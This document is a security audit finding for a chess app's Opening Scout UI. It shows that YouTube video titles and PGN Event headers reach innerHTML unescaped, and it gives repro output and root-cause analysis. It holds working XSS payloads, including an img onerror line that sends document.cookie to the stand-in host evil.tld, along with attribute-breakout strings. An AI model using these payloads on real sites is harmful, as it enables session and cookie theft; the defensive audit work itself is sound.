# SCOUT-01 — Remote/attacker-controlled strings injected raw into `innerHTML` by the Scout UI (XSS)
- **Severity:** high
- **Type:** security
- **File:** frontend/scout.js
- **Line(s):** 463-483 (`renderResults`), 1204/1214/1545/1555 (`title="${wData.message}"`), 1259 (`${line.name}`), 1270 (`${line.pgn}`)
- **Component:** Opening Scout — search results grid + session line tree
- **Repro script:** `audit/scripts/atk4_01_xss_repro.py` + `audit/scripts/atk4_01_xss_render.js`
- **Detected by:** ATTACKER-4 (SCOUT)

## Expected
Any string that originates outside the app (YouTube video title / channel, cached
`scouted_content.title`, PGN `Event` header, Lichess study text) must be inserted with
`textContent` / a DOM API / an escaping helper before it reaches `innerHTML`.
`frontend/index.html` ships **no Content-Security-Policy**, so injected script executes with
full page privileges inside the Electron shell.

## Actual
`renderResults()` builds its card markup by template-string interpolation of server fields:

```js
grid.innerHTML = filtered.map(item => {
    ...
    return `
        <div class="card-panel scout-card" data-source-id="${item.id}" data-source-type="${item.source_type}">
          <div class="scout-card-thumb-wrap">
            <img src="${thumb}" alt="${item.title}" class="scout-card-thumb" onerror="...">
            <span class="scout-card-duration">${item.duration_formatted || ''}</span>
          </div>
          <div class="scout-card-body">
            <div class="scout-card-meta">${sourceBadge} ${ecoBadge}</div>
            <div class="scout-card-title" title="${item.title}">${item.title}</div>
            <div class="scout-card-channel">${item.channel || 'Chess Guide'}</div>
```

`item.title` is YouTube's video title — fully attacker-controlled (anyone can publish a video).
`yt_dlp` is mocked in the repro; nothing is crawled.

Observed server output (`GET /api/scout/search?query=Sicilian+Defense&limit=5`):

```
server returned title: '<img src=x onerror="fetch(`http://evil.tld/x?c=`+document.cookie)">'
server returned title: 'Benoni For Busy People " onmouseover="alert(1)" x="'
```

Observed markup produced by the **real** `renderResults()` body (extracted verbatim from
`frontend/scout.js` and executed under node, `audit/scripts/atk4_01_xss_render.js`):

```
<div class="scout-card-title" title="<img src=x onerror="fetch(`http://evil.tld/x?c=`+document.cookie)">"><img src=x onerror="fetch(`http://evil.tld/x?c=`+document.cookie)"></div>
...
<img src="https://i.ytimg.com/vi/rmbU97iftC8/hqdefault.jpg" alt="Benoni For Busy People " onmouseover="alert(1)" x="" class="scout-card-thumb" onerror="this.src='/assets/pieces/wN.svg'">

>>> INJECTED LIVE MARKUP FOUND: 4
```

Second, *persisted* sink. `_analyze_youtube_video()` falls back to the raw video title when no
ECO matches (`backend/scout.py:225-226`):

```python
eco = "A00"
opening_name = title
eco_matches = self.opening_book.search_openings(title, limit=1)
```

That `opening_name` is written to `scouted_content` and returned to the browser, and
`scout.js:_onUserBoardMove` stamps it onto **every** move object of the session tree
(`opening_name: this.activeStudy?.opening_name || ''`). `renderTreeLines()` then prints it raw:

```
===== SINK 2: renderTreeLines() line name (from activeStudy.opening_name) =====
<span style="font-weight:700; color:#fff; font-size:0.83rem;"><img src=x onerror="fetch(`http://evil.tld/x?c=`+document.cookie)"></span>
>>> contains raw <img ... onerror=...>: true
```

So opening any non-ECO-matching chess video and playing a single move injects the video
creator's string into the DOM — this is a *stored* path (the value is also written into the
`scouted_content` table and into the `recent_learned_opening` setting).

**Third route — no YouTube needed at all: an imported PGN's `[Event]` header.**

```
POST /api/scout/analyze  {"source": "[Event \"<img src=x onerror=alert(1)>\"]\n\n1. e4 e5 *"}
  returned title      : '<img src=x onerror=alert(1)>'
  returned opening    : '<img src=x onerror=alert(1)>'
  variation name      : '<img src=x onerror=alert(1)>'
  scouted_content row : {'source_id': 'pgn_9b0fe18df9', 'title': '<img src=x onerror=alert(1)>',
                         'opening_name': '<img src=x onerror=alert(1)>', ...}
  /api/scout/recent   : [('pgn_9b0fe18df9', '<img src=x onerror=alert(1)>'), ...]
```

`opening_name` is again stamped onto every move of the session tree, so pasting any
third-party "opening repertoire" PGN whose `Event` tag contains HTML fires the payload in
`renderTreeLines()`. `study_name` also defaults to this string
(`scout.js:1624 (this.activeStudy?.title || …)`), so the study created in the repertoire is
named `<img src=x onerror=…>` and is later rendered unescaped by
`renderTreeLines()`'s `lineStudy` span.

## Root cause
Zero escaping anywhere in the Scout rendering path. `renderResults`, `renderTreeLines` and
`_applyTreeBadges` all assign `innerHTML` from strings that ultimately derive from
`yt_dlp` metadata / cached `data_json` / PGN headers. Attribute contexts
(`title="…"`, `alt="…"`, `data-source-id="…"`) are equally breakable with a single `"`.

## Exploit / escalation
1. **Any user searches anything** (`OpeningScout._init()` fires `search('Caro-Kann Defense')`
   on every page load) → any attacker-uploaded video whose title contains HTML fires in the
   victim's Electron renderer. No click required beyond opening the Scout tab.
2. **Attribute breakout without `<`**: a title of `x" onerror="alert(document.cookie)` is
   enough — no angle brackets needed.
3. **Third sink**: `renderTreeLines` / `_applyTreeBadges` place the server-built overlap
   message in an attribute: `title="${wData.message}"`. `check_line_overlap` builds that
   message partly from client-supplied `san`/`uci` strings
   (`backend/repertoire.py:1121`, `1130-1131`), so a `san` value containing `"` breaks the
   attribute. Same for `${line.pgn}` (built from `m.san`).
4. `loadRecent()` (scout.js:416) maps `/api/scout/recent` rows — whose `title` column can hold
   an imported PGN's `[Event "..."]` header — into the same `renderResults()` template. It is
   currently not called from anywhere in the UI, so this is a latent 4th sink.
